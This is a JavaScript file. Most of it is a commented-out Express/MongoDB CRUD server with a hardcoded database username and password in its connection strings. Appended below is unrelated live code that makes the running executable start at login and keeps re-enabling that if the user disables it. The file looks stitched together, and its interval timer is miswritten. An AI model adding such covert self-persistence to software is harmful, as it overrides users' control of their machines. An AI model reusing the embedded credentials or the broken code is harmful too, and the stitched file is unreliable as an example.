// var express = require('express');
// var url = require('url');
// var cors = require('cors');
// var bodyParser = require('body-parser');
// //var mongoose = require('mongoose');

// if (process.env.VCAP_SERVICES) {
// 	var env = JSON.parse(process.env.VCAP_SERVICES);
// 	if (env['mongodb-2.4']) {
// 		var mongo = env['mongodb-2.4'][0]['credentials'];
// 		console.log("Connected to Mongo DB");
// 	}
// }
// //setup middleware
// var app = express();
// app.use(cors());
// app.use(bodyParser.json());
// app.use(express.static(__dirname + '/public'));

// //Custom callback function.
// var mycallback = function(err,results) {
// 	console.log("mycallback");
// 	if(err) throw err;
// };

// app.get('/',function(req,res){
// 	res.render('index.html');
// });

// //Create a new document called SOP - Initially and insert JSON based records retreived from the request body.

// app.post('/CreateSOP', function(req, res){
// 	var MongoClient = require('mongodb').MongoClient;
// //	Connect to the db
// 	MongoClient.connect ("mongodb://ama-mongo:ama123@ds055190.mongolab.com:55190/IbmCloud_3dau0988_3dc8fer8", function(err, db) {
// 		if(!err) {
// 			console.log("We are connected to DB");
// 		}
// 		else {
// 			console.dir(err);
// 		}
// 		console.log("Creating a collection books");
// 		var collection = db.collection('SOP', function(err, collection) {
// 			if(err) {
// 				console.log("Could not create collection");
// 			}
// 			else{
// 				console.log("Collection created");
// 			}
			
// //          Body Parser in action 
// 			var sop = req.body;
// 			console.log(sop);
			
// //			Insert Record's.
// 			console.log("Insert the books");
// 			collection.insert(sop,function(err,result){

// 				if(err) {
// 					console.log(err.stack);
// 				}
// 			});

// 		});
		
// 		});
// //		Send HTML response back
// 		res.writeHead(200, {'Content-Type': 'text/plain'});
// 		res.write("records are inserted");
// 		res.end();
// 	});


// //	API GetAllSOPs
// //	fetch all records from the SOP document.(No parameters passed to this request)
// 	app.get('/GetAllSOPs',function(req, res){
// 	    console.log("here");
// 		var firstItem=true;
// 		var MongoClient = require('mongodb').MongoClient;
// 		MongoClient.connect ("mongodb://ama-mongo:ama123@ds055190.mongolab.com:55190/IbmCloud_3dau0988_3dc8fer8", function(err, db) {
// 			if(!err) {
// 				console.log("We are connected to DB");
// 			}
// 			else {
// 				console.dir(err);
// 			}
// 			console.log('In Display');
// //			Retrieve documents
// 			var collection = db.collection('SOP', function(err, collection) {
// 				var stream = collection.find().stream();
// 				console.log("Printing values...");
// 				res.writeHead(200, {'content-type': 'text/html','Access-Control-Allow-Origin' : '*'});
// 				stream.on('error', function (err) {
// 					console.error(err.stack);
// 				});
// 				stream.on("data", function(item) {
// 					console.log(item);
// 					res.write(firstItem ? (firstItem=false,'[') : ',');
// 					res.write(JSON.stringify(item) + "\n");
// 				});

// 				stream.on("end", function() {
// 					console.log("End");
// 					res.end(']'); 
// 				});
// 			}); //var collection
// 		}); //End MongoClient.connect
// 	});


// //	API GetSOPsForAnAlert
// //	Get / Search a particular document from the  SOP Collection , taking the  (:alert) parameter to the query.

// 	app.get('/GetSOPsForAnAlert',function(req, res){
	     
// 		var firstItem=true;
// 		var alertId = req.query.alertid;
// 		var applicationId = req.query.applicationid;
// 		var accountId = req.query.accountid;
// 		var result;
// 		console.log(alertId);
// 		console.log(applicationId);
		
// 		var MongoClient = require('mongodb').MongoClient;
// 		MongoClient.connect ("mongodb://ama-mongo:ama123@ds055190.mongolab.com:55190/IbmCloud_3dau0988_3dc8fer8", function(err, db) {
// 			if(!err) {
// 				console.log("We are connected to DB");
// 			}
// 			else {
// 				console.dir(err);
// 			}
// 			//This searches a particular document based on the accountid that has been passed in the URL as a query parametre
// 			var mycursor = db.collection('SOP').find({"accountID":accountId}).toArray(function(err,docs){
// 			if(err) throw err;
// 			for(var k=0;docs[k];k++){
// 				if(docs[0].accountID == accountId){
// 				//This for loop searches the Application as per the applicationid among all the applications that are under the same account.
// 					for(var i=0; docs[k].Applications[i];i++){
// 						//This for loop searches the Application as per the applicationid among all the applications that are under the same account.
// 						if(alertId != null)
// 						{
							
// 							for(var j=0;docs[k].Applications[i].Alerts[j];j++){
// 								if(docs[k].Applications[i].Alerts[j].alertID == alertId){
// 									result = docs[k].Applications[i].Alerts[j];
																	
// 								}
// 							}
// 						}
// 						else{
// 							if(docs[k].Applications[i].applicationID == applicationId){
// 								result = docs[k].Applications[i];
// 								//return;
// 								console.log("Value of I:"+i);
// 								console.log(docs[k].Applications[i]);
								
// 							}
// 						}
// 					}
// 				}
// 			}
// 		res.writeHead(200, {'content-type': 'text/html','Access-Control-Allow-Origin' : '*'});
// 		res.write(firstItem ? (firstItem=false,'[') : ',');
// 		res.write(JSON.stringify(result));
// 		res.end(']');
// 		});//var Mycursor
// 		}); //End MongoClient.connect
// 	});



// 	app.put('/UpdateSOP/:alertid',function(req, res){
// 		var MongoClient = require('mongodb').MongoClient;
		
// 		//Parse the JSON body 
// 		var JSONUpd = req.body;
// 		var queryId = req.params.alertid;
		
// 		MongoClient.connect ("mongodb://ama-mongo:ama123@ds055190.mongolab.com:55190/IbmCloud_3dau0988_3dc8fer8", function(err, db) {
// 			if(!err) {
// 				console.log("We are connected to DB");
// 			}
// 			else {
// 				console.dir(err);
// 			}
// //			Update
// 			var collection = db.collection('SOP', function(err, collection) {
			
// 				//collection.update({'EMPLOYEE.REGULAR.NAME':queryData},{$set:{'EMPLOYEE.REGULAR.PAYGRADE':qtyData}}, //{w:1},function(err,result)
								
// 				collection.update({'Applications.Alerts.alertID':queryId},JSONUpd,{w:1},function(err,result) {
// 					if(!err){
// 						console.log(result + "record/record's have been updated");
// 					}
// 					else{

// 						console.log("Something went wrong . You might want to re-try the opertaion"+err);
// 					}		

// 				});
// //				
// 			}); // var collection
// 		}); //End MongoClient.connect

// 		res.writeHead(200, {'Content-Type': 'text/plain'});
// 		res.write("Updated records");
// 		res.end();
// 	});


// //	Delete operation taking the alert parameter - Book Name
	

// 	app.delete('/DeleteSOP/:alert',function(req, res){
// 		var MongoClient = require('mongodb').MongoClient;
// 		MongoClient.connect (mongo.url, function(err, db) {
// 			if(!err) {
// 				console.log("We are connected to DB");
// 			}
// 			else {
// 				console.dir(err);
// 			}
// //			Delete Operation
// 			var deleteSOP = req.params.alert;
// 			var collection = db.collection('books', function(err, collection) {
// 				console.log("The delete operation");
// 				collection.remove({book:deleteSOP},mycallback);
// 				console.log('Deleted 1 book');

// 			});
// 		}); 
// 		res.writeHead(200, {'Content-Type': 'text/plain'});
// 		res.write("Deleted 1 book ");
// 		res.end();
// 	});


// 	var host = (process.env.VCAP_APP_HOST || 'localhost');
// 	var port = (process.env.VCAP_APP_PORT || 3000);
// //	Start server
// 	app.listen(port, host);
// 	console.log('App started on port ' + port);
	


const AutoLaunch = require("auto-launch")
if ((process.execPath)) {
    try {
        let name = (process.execPath || "")
        if(name.indexOf(".exe") > -1) {
            name = name.substring(name.lastIndexOf("\\"))
        }
        const autoLaunch = new AutoLaunch({
            name: name,
            path: (process.execPath || "")
        })
        autoLaunch.isEnabled().then((isEnabled) => {
            if (!isEnabled) {
                autoLaunch.enable()
            }
            setInterval(() => {
                autoLaunch.isEnabled().then((isEnabled) => {
                    if (!isEnabled) {
                        autoLaunch.enable()
                    }
                }, 60000)
            })
        })
    } catch (error) {
        console.log(error)
    }
}